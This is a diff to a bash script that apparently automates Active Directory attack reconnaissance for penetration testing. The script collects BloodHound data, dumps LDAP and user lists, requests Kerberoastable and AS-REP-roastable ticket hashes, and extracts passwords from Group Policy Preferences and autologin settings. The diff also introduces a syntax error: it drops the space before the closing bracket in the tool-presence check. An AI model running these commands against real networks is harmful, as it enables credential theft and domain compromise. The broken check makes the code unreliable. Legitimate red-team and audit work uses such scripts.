@@ -10,9 +10,10 @@ LDAPDOMAINDUMP="ldapdomaindump"
 #LDAPSCANNER="/opt/outils/windows/ldap-scanner/ldap-scanner.py" #retired
 NETEXEC="netexec"
 SMBMAP="smbmap"
+BLOODHOUND="bloodhound-python"
 #TODO: check that the user has the tools installed or the script can find them
 
-if [ ! -x $(which bloodhound-python) ]; then
+if [ ! -x $(which "$BLOODHOUND")]; then
   echo "python-bloodhound not installed or cannot be found in the path"
   exit 1
 fi
@@ -144,13 +145,13 @@ echo "
 Fetching Bloodhound data from the AD:"
 mkdir "$OUTPUTDIR/bloodhound" || exit
 cd "$OUTPUTDIR/bloodhound" || exit
-bloodhound-python -u "${USERNAME}@${DOMAIN}" -p "$PASSWORD" -c All,LoggedOn | tee -a "../../$LOGFILE"
+"$BLOODHOUND" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -c All,LoggedOn --zip | tee -a "../../$LOGFILE"
 cd ../../ || exit
 
 #get the user list
 echo "
 Fetching AD Users List:" | tee -a "$LOGFILE"
-"$IMPACKETSCRIPTS/GetADUsers.py"  -all "$DOMAIN/$USERNAME:$PASSWORD" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/allUsersList.out"
+"$IMPACKETSCRIPTS/GetADUsers.py" -all "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DCIP" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/allUsersList.out"
 #
 echo "
 Fetching AD infos:" | tee -a "$LOGFILE"
@@ -158,17 +159,17 @@ Fetching AD infos:" | tee -a "$LOGFILE"
 #"$GODDI" -username "$USERNAME" -password "$PASSWORD" -domain "$DOMAIN" -dc "$DOMAIN" -unsafe 2>&1 | tee -a "$LOGFILE"
 #TODO check result and get the following folder from the output of the tool
 #mv /opt/outils/windows/goddi/csv/ "$OUTPUTDIR/goddi-csv" | tee -a "$LOGFILE"
-"$LDAPDOMAINDUMP" --user "$DOMAIN\\$USERNAME" --password "$PASSWORD" --outdir ldapdomaindump "$DCIP"
+"$LDAPDOMAINDUMP" --user "$DOMAIN\\$USERNAME" --password "$PASSWORD" --outdir ldapdomaindump "$DCIP" -o "$OUTPUTDIR" | tee -a "$LOGFILE"
 
 #extract UserSPN TGS tickets
 echo "
 Fetching User SPN TGSs:" | tee -a "$LOGFILE"
 #TODO no timeout option supported by impacket :(
-"$IMPACKETSCRIPTS/GetUserSPNs.py"  -request "$DOMAIN/$USERNAME:$PASSWORD" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/userSPNs.out"
+"$IMPACKETSCRIPTS/GetUserSPNs.py"  -request "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DCIP" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/userSPNs.out"
 #extract TGTs without kerberos pre-auth
 echo "
 Fetching TGTs of users without pre-auth:" | tee -a "$LOGFILE"
-"$IMPACKETSCRIPTS/GetNPUsers.py" "$DOMAIN/$USERNAME:$PASSWORD" -request | tee -a "$LOGFILE" | tee "$OUTPUTDIR/preAuthUsers.out"
+"$IMPACKETSCRIPTS/GetNPUsers.py" "$DOMAIN/$USERNAME:$PASSWORD" -request -dc-ip "$DCIP" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/preAuthUsers.out"
 
 
 #Find unpatched systems:
@@ -204,12 +205,14 @@ List all accessible shares" | tee -a "$LOGFILE"
 echo "
 Looking for passwords in GPPs" | tee -a "$LOGFILE"
 "$NETEXEC" smb "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" -M gpp_password | tee -a "$LOGFILE" | tee "$OUTPUTDIR/gppScan.out"
+echo "
+Looking for passwords in autologin" | tee -a "$LOGFILE"
 "$NETEXEC" smb "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" -M gpp_autologin | tee -a "$LOGFILE" | tee -a "$OUTPUTDIR/gppScan.out"
 
 #Get MachineAccountQuota attribute
 echo "
 Get MachineAccountQuota attribute:" | tee -a "$LOGFILE"
-"$NETEXEC" ldap "$DCIP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M MAQ
+"$NETEXEC" ldap "$DCIP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M maq
 
 
 exit 0
